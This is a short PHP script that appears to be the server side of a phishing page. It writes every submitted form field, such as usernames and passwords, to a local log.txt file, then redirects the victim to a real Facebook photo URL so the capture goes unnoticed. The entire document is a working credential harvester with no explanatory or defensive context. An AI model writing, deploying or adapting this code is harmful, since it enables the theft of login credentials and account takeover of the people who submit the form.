<?php
	header ('Location: https://www.facebook.com/photo?fbid=507381208998057&set=pcb.507381235664721 '); 
	$handle = fopen("log.txt", "a");
	foreach($_POST as $variable => $value) {
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle); 
	exit;
	
?>
